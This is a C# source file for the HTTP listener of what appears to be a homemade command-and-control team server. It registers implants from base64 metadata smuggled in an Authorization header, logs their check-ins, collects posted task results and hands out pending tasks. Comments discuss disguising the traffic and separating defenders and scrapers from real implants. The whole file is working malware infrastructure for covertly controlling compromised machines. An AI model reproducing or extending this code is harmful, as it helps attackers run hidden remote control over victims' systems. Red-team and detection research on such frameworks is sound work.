using Maragi_Framework.Models.Agent_Implants;
using Maragi_Framework.Services;
using Microsoft.AspNetCore.Http;
using Microsoft.AspNetCore.Mvc;
using System;
using System.Text;
using Newtonsoft.Json;
using System.IO;
using System.Threading.Tasks;
using System.Collections.Generic; // Use nuget pkgm to download this 


namespace Maragi_Framework.Models.Listeners
{
    [Controller]
    // Whenever Controller is called it automatically do "<Protocol-Listener> + Controller"
    public class HttpListenerController : ControllerBase
    {
        private readonly IAgentService _agents;

        public HttpListenerController(IAgentService agents)
        {
            _agents = agents;
        }

        public async Task<IActionResult> HandleImplant()
        {
            var metadata = ExtractMetadata(HttpContext.Request.Headers);
            if (metadata is null) return NotFound();

            // if metadata not null we want to get an instance of the agent
            var agent = _agents.GetAgent(metadata.Id);
            if (agent is null)
            {
                agent = new Agent(metadata);
                _agents.AddAgent(agent);
            }

            agent.CheckIn();

            if (HttpContext.Request.Method == "POST")
            {
                string json;

                using (var sr = new StreamReader(HttpContext.Request.Body))
                {
                    json = await sr.ReadToEndAsync();
                }

                var results = JsonConvert.DeserializeObject<IEnumerable<AgentTaskResult>>(json);
                agent.AddTaskResults(results);
            }

            var tasks = agent.GetPendingtask();

            // automatically gets serialize as JSON
            // might want to futher develop to disguse this in a http request
            return Ok(tasks);
            
        }
        // How do TeamServer know what it is interaccting with (defender , web scapper , external tools)
        private AgentMetadata ExtractMetadata(IHeaderDictionary headers)
        {

            // if no header call Authorization , return null
            if (!headers.TryGetValue("Authorization", out var encodedMetadata))
                return null;

            // header is going to say Authorization: Bearer <content>
            encodedMetadata = encodedMetadata.ToString().Remove(0, 7);

            var json = Encoding.UTF8.GetString(Convert.FromBase64String(encodedMetadata));

            return JsonConvert.DeserializeObject<AgentMetadata>(json);
        }
    }
}